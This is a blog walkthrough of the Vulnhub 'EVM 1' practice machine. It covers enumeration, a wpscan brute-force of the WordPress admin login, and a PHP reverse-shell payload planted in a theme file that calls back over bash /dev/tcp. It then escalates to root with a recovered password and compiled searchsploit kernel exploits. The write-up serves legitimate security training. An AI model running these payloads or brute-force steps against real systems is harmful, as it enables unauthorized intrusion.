<!doctype html><html lang=en><head><title>Vulnhub: EVM 1 ::</title><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content><meta name=keywords content=","><meta name=robots content="noodp"><link rel=canonical href=https://blog.ikuamike.io/posts/2021/evm/><meta name=twitter:card content="summary"><meta name=twitter:title content="Vulnhub: EVM 1"><meta name=twitter:description content><link rel=stylesheet href=https://blog.ikuamike.io/assets/style.css><link rel=stylesheet href=https://blog.ikuamike.io/assets/green.css><link rel=stylesheet href=https://blog.ikuamike.io/style.css><link rel=apple-touch-icon href=https://blog.ikuamike.io/img/apple-touch-icon-192x192.png><link rel="shortcut icon" href=https://blog.ikuamike.io/img/favicon/green.png><meta name=twitter:card content="summary_large_image"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="og:title" content="Vulnhub: EVM 1"><meta property="og:description" content><meta property="og:url" content="https://blog.ikuamike.io/posts/2021/evm/"><meta property="og:site_name" content><meta property="og:image" content="https://blog.ikuamike.io/"><meta property="og:image:width" content="2048"><meta property="og:image:height" content="1024"><meta property="article:published_time" content="2021-03-05 00:00:00 +0000 UTC"></head><body class=green><div class="container center headings--one-size"><header class=header><div class=header__inner><div class=header__logo><a href=/><div class=logo>> cd ~</div></a></div><div class=menu-trigger>menu</div></div><nav class=menu><ul class="menu__inner menu__inner--desktop"><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li><ul class=menu__sub-inner><li class=menu__sub-inner-more-trigger>Show more ▾</li><ul class="menu__sub-inner-more hidden"><li><a href=/webinars>Webinars</a></li></ul></ul></ul><ul class="menu__inner menu__inner--mobile"><li><a href=/about>About Me</a></li><li><a href=/all-posts>All Posts</a></li><li><a href=/tags>Tags</a></li><li><a href=/webinars>Webinars</a></li></ul></nav></header><div class=content><div class=post><h1 class=post-title><a href=https://blog.ikuamike.io/posts/2021/evm/>Vulnhub: EVM 1</a></h1><div class=post-meta><span class=post-date>2021-03-05</span></div><span class=post-tags>#<a href=https://blog.ikuamike.io/tags/beginner/>Beginner</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/vulnhub/>Vulnhub</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/oscp-prep/>OSCP Prep</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/password-bruteforce/>Password Bruteforce</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/wordpress/>WordPress</a>&nbsp;
#<a href=https://blog.ikuamike.io/tags/wpscan/>WPScan</a>&nbsp;</span><div class=post-content><div><img src=/img/evm/evm.png alt=symfonos class=center style=border-radius:8px><table><thead><tr><th>Difficulty</th><th>Release Date</th><th>Author</th></tr></thead><tbody><tr><td>Beginner</td><td>2 Nov 2019</td><td>Ic0de</td></tr></tbody></table><h1 id=summary>Summary<a href=#summary class=hanchor arialabel=Anchor>&#8983;</a></h1><p>This was an easy box, initial foothold was on wordpress. You needed to bruteforce the admin creds
then get a reverse shell via editing a theme file to get the reverse shell. Escalating to root
was straightforward as we found the root password in a txt file. Some kernel exploits could have also
been used for privilege escalation.</p><h1 id=reconnaissance>Reconnaissance<a href=#reconnaissance class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Nmap</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>Nmap scan report <span style=color:#66d9ef>for</span> 192.168.56.103
Host is up <span style=color:#f92672>(</span>0.00028s latency<span style=color:#f92672>)</span>.

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
| ssh-hostkey:
|   <span style=color:#ae81ff>2048</span> a2:d3:34:13:62:b1:18:a3:dd:db:35:c5:5a:b7:c0:78 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
|   <span style=color:#ae81ff>256</span> 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
|_  <span style=color:#ae81ff>256</span> 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
53/tcp  open  domain      ISC BIND 9.10.3-P4 <span style=color:#f92672>(</span>Ubuntu Linux<span style=color:#f92672>)</span>
| dns-nsid:
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp  open  http        Apache httpd 2.4.18 <span style=color:#f92672>((</span>Ubuntu<span style=color:#f92672>))</span>
|_http-server-header: Apache/2.4.18 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: CAPA RESP-CODES SASL AUTH-RESP-CODE TOP UIDL PIPELINING
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X <span style=color:#f92672>(</span>workgroup: WORKGROUP<span style=color:#f92672>)</span>
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: more post-login LOGINDISABLEDA0001 ID LOGIN-REFERRALS listed IMAP4rev1 have capabilities OK ENABLE Pre-login LITERAL+ SASL-IR IDLE
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu <span style=color:#f92672>(</span>workgroup: WORKGROUP<span style=color:#f92672>)</span>
Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: -1s
|_nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span style=color:#f92672>(</span>unknown<span style=color:#f92672>)</span>
| smb-os-discovery:
|   OS: Windows 6.1 <span style=color:#f92672>(</span>Samba 4.3.11-Ubuntu<span style=color:#f92672>)</span>
|   Computer name: ubuntu-extermely-vulnerable-m4ch1ine
|   NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE<span style=color:#ae81ff>\x</span><span style=color:#ae81ff>00</span>
|   Domain name: <span style=color:#ae81ff>\x</span><span style=color:#ae81ff>00</span>
|   FQDN: ubuntu-extermely-vulnerable-m4ch1ine
|_  System time: 2021-03-04T15:43:32-05:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled <span style=color:#f92672>(</span>dangerous, but default<span style=color:#f92672>)</span>
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-03-04T20:43:32
|_  start_date: N/A
</code></pre></div><h1 id=enumeration>Enumeration<a href=#enumeration class=hanchor arialabel=Anchor>&#8983;</a></h1><h2 id=samba-139445>Samba (139,445)<a href=#samba-139445 class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Running smbmap and smbclient there&rsquo;s not much there.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>smbmap -R -H 192.168.56.103

smbclient -L <span style=color:#ae81ff>\\</span>192.168.56.103 -N
</code></pre></div><img src=/img/evm/evm1.png alt=symfonos class=center style=border-radius:8px><p>From enum4linux-ng we only get a username</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>enum4linux-ng -A -R 192.168.56.103
</code></pre></div><img src=/img/evm/evm2.png alt=symfonos class=center style=border-radius:8px><h2 id=http-80>HTTP (80)<a href=#http-80 class=hanchor arialabel=Anchor>&#8983;</a></h2><p>Visiting the ip on the browser there&rsquo;s only the apache default page.</p><p>Running directory bruteforce, we discover wordpress.</p><img src=/img/evm/evm3.png alt=symfonos class=center style=border-radius:8px><p>Wordpress:</p><img src=/img/evm/evm4.png alt=symfonos class=center style=border-radius:8px><p>Some of the comments hint towards bruteforcing credentials.</p><img src=/img/evm/evm5.png alt=symfonos class=center style=border-radius:8px><p>Bruteforcing the login page on wordpress we get the password <code>24992499</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>wpscan --url http://192.168.56.103/wordpress/ -U c0rrupt3d_brain -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt -t <span style=color:#ae81ff>100</span>
</code></pre></div><img src=/img/evm/evm7.png alt=symfonos class=center style=border-radius:8px><h1 id=shell-as-www-data>Shell as www-data<a href=#shell-as-www-data class=hanchor arialabel=Anchor>&#8983;</a></h1><p>With admin access we can edit one of the wordpress theme files to get a reverse shell with this php payload.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span> <span style=color:#a6e22e>exec</span>(<span style=color:#e6db74>&#34;/bin/bash -c &#39;/bin/bash -i &gt;&amp; /dev/tcp/192.168.56.1/9000 0&gt;&amp;1 &amp;&#39;&#34;</span>)<span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></code></pre></div><img src=/img/evm/evm6.png alt=symfonos class=center style=border-radius:8px><p>Loading the following url we get a reverse shell.</p><pre><code>http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/404.php
</code></pre><img src=/img/evm/evm8.png alt=symfonos class=center style=border-radius:8px><p>Changing directory to /home there&rsquo;s one user&rsquo;s folder. Looking at all the files in this directory there&rsquo;s a hidden
file with the root user&rsquo;s password.</p><img src=/img/evm/evm9.png alt=symfonos class=center style=border-radius:8px><h1 id=shell-as-root>Shell as root<a href=#shell-as-root class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Using the password <code>willy26</code> I switched to the root user.</p><img src=/img/evm/evm10.png alt=symfonos class=center style=border-radius:8px><h1 id=extras>Extras<a href=#extras class=hanchor arialabel=Anchor>&#8983;</a></h1><p>Privilege escalation could have also been achieved via kernel exploit.</p><img src=/img/evm/evm11.png alt=symfonos class=center style=border-radius:8px><p>The box is running ubuntu 16.04.3 and kernel version 4.4.0-87. Searching for exploits using searchsploit
we get several hits.</p><img src=/img/evm/evm12.png alt=symfonos class=center style=border-radius:8px><p>Getting the first local privilege escalation script and transferring the compiled binary to the target, it works.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sh data-lang=sh>searchsploit -m <span style=color:#ae81ff>45010</span>

gcc 45010.c -o pwn
</code></pre></div><img src=/img/evm/evm13.png alt=symfonos class=center style=border-radius:8px><p>The second one <code>44298</code> also works.</p><img src=/img/evm/evm14.png alt=symfonos class=center style=border-radius:8px></div></div><div class=pagination><div class=pagination__title><span class=pagination__title-h>Read other posts</span><hr></div><div class=pagination__buttons><span class="button previous"><a href=https://blog.ikuamike.io/posts/2021/healthcare1/><span class=button__icon>←</span>
<span class=button__text>Vulnhub: Healthcare 1</span></a></span>
<span class="button next"><a href=https://blog.ikuamike.io/posts/2021/symfonos5/><span class=button__text>Vulnhub: Symfonos 5</span>
<span class=button__icon>→</span></a></span></div></div></div></div><footer class=footer><div class=footer__inner><div class="copyright copyright--user"><span>© Michael Ikua</span>
<span>:: Theme made by <a href=https://twitter.com/panr>panr</a></span></div></div></footer><script src=https://blog.ikuamike.io/assets/main.js></script><script src=https://blog.ikuamike.io/assets/prism.js></script></div><script src=https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js></script><script>addBackToTop({diameter:40,backgroundColor:'rgb(120, 226, 160)',textColor:'#1F222A',cornerOffset:30})</script></body></html>